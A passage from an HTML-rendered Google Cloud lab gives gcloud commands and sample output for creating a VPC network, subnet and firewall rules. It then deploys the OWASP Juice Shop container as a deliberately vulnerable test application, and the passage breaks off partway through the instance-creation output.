height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACTIVE: *</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACCOUNT: "ACCOUNT"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">To set the active account, run:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  $ gcloud config set account `ACCOUNT`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><ol start='' ><li><p><span>(Optional) You can list the project ID with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = "PROJECT_ID"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> For full documentation of </span><code>gcloud</code><span>, in Google Cloud, refer to </span><a href='https://cloud.google.com/sdk/gcloud'><span>the gcloud CLI overview guide</span></a><span>.</span></p><h3 id='before-you-begin-4'><span>Before you begin</span></h3><ul><li><p><span>In Cloud Shell, set up your project ID:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export PROJECT_ID=$(gcloud config get-value project)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo $PROJECT_ID</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config set project $PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><h2 id='task-1-create-the-vpc-network'><span>Task 1. Create the VPC network</span></h2><ul><li><p><span>In Cloud Shell, enter the following command to create a VPC network:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks create Network Name --subnet-mode custom</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp;  SUBNET_MODE  BGP_ROUTING_MODE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Network Name  CUSTOM &nbsp; &nbsp; &nbsp; REGIONAL</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><h3 id='create-a-subnet'><span>Create a subnet</span></h3><ul><li><p><span>In Cloud Shell, enter the following command to create a subnet:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks subnets create Subnet Name \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --network Network Name --range 10.0.0.0/24 --region Region</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; REGION &nbsp; &nbsp; &nbsp; NETWORK &nbsp; &nbsp; &nbsp; RANGE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Subnet Name Region  Network Name &nbsp;  10.0.0.0/24</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><h3 id='create-vpc-firewall-rules'><span>Create VPC firewall rules</span></h3><p><span>After creating the VPC and subnet, set up a few firewall rules.</span></p><ul><li><p><span>The first firewall rule named </span><code>allow-js-site</code><span> allows all IPs to access the external IP of the test application&#39;s website on port </span><code>3000</code><span>.</span></p></li><li><p><span>The second firewall rule named </span><code>allow-health-check</code><span> allows health-checks from source IP of the load balancers.</span></p></li></ul><ol start='' ><li><p><span>In Cloud Shell, enter the following command to create a firewall rule to allow all IPs to access the application:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create Firewall Name --allow tcp:3000 --network Network Name</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Creating firewall...done.</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NETWORK &nbsp; &nbsp; DIRECTION  PRIORITY  ALLOW &nbsp; &nbsp; DENY  DISABLED</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Firewall Name Network Name INGRESS &nbsp;  1000 &nbsp; &nbsp;  tcp:3000 &nbsp; &nbsp; &nbsp;  False</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><ol start='' ><li><p><span>In Cloud Shell, enter the following command to create firewall rule to allow health-checks from the Google health-check ranges:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create Firewall Name1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --network=Network Name \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --action=allow \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --direction=ingress \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --source-ranges=130.211.0.0/22,35.191.0.0/16 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --target-tags=allow-healthcheck \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --rules=tcp</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Creating firewall...done.</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  NETWORK &nbsp; &nbsp; DIRECTION  PRIORITY  ALLOW  DENY  DISABLED</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Firewall_Name1  Network Name  INGRESS &nbsp;  1000 &nbsp; &nbsp;  tcp &nbsp; &nbsp; &nbsp; &nbsp;  False</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create the VPC network</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-2-set-up-the-test-application'><span>Task 2. Set up the test application</span></h2><p><span>Create the test application, in this case, the OWASP Juice Shop web server. When you create the compute instance, you use a container image to ensure the server has the appropriate services. You deploy this server in the </span><code>Zone</code><span> and has a network tag that allows health checks.</span></p><h3 id='create-the-owasp-juice-shop-application'><span>Create the OWASP Juice Shop application</span></h3><ul><li><p><span>Use the open source well-known OWASP Juice Shop application to serve as the vulnerable application. You can also use this application to do OWASP security challenges through the </span><a href='https://owasp.org/www-project-juice-shop/'><span>OWASP website</span></a><span>.</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create-with-container vm_instance --container-image bkimminich/juice-shop \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; --network Network Name \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; --subnet Subnet Name \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; --private-network-ip=10.0.0.3 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; --machine-type n1-standard-2 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; --zone Zone \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; --tags allow-healthcheck</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  ZONE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MACHINE_TYPE &nbsp; PREEMPTIBLE &nbsp;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">vm_instance  Zone  n1-standard-2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 